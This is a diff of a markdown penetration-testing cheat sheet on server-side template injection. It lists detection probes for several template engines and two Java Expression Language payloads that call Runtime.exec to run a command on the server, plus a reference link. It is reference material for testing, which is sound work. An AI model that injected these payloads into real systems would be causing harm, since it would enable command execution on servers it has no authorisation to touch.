@@ -555,27 +555,34 @@ https://ivangoncharov.github.io/graphql-voyager/
 
 #### Identify
 
-jinja2 or twig
+-> Jinja2 orTwig
+  
 {{3*3}}
 
-smarty or mako
+-> Smarty or Mako
+  
 {3*3}
 
 ERB(Ruby)
+  
 <%= 7*7 %>
 
-others
+-> Others
+  
 ${3*3}
+  
 ${{3*3}}
+  
 #{3*3}
+  
 3*3
-
-#### Doc for SSTI	
-
-https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 
 #### Java Expression Language
 
 {{T(java.lang.Runtime).getRuntime().exec('id')}}
 
 ''.class.forName('java.lang.Runtime').getRuntime().exec('id')
+  
+#### Doc for SSTI	
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
